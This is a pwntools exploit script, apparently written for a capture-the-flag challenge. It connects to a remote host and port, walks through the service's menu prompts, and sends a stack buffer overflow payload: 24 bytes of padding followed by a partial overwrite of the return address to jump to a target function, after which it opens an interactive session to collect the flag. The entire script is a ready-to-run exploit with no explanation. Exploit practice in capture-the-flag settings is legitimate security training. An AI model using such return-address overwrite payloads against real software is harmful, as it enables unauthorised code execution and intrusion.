from pwn import remote, p64

HOST = '94.237.123.119'
PORT = 55905

p = remote(HOST, PORT)

p.recvuntil(b'Show map? (y/n): ')
p.sendline(b'n')

p.recvuntil(b'>> ')
p.sendline(b'1')

p.recvuntil(b'custom nickname? (y/n): ')

goal_addr = 0x00401316

payload = b'A' * 24
payload += p64(goal_addr)[:6]

print(f"\n[*] Payload length: {len(payload)} bytes")
print(f"[*] Payload: {payload}")
print(f"[*] Hex: {payload.hex()}")

p.sendline(payload)

try:
    print("\n[*] Attempting to receive flag...")
    p.interactive()
except EOFError:
    print("\n[!] Process ended")
    print(p.recvall(timeout=1).decode())
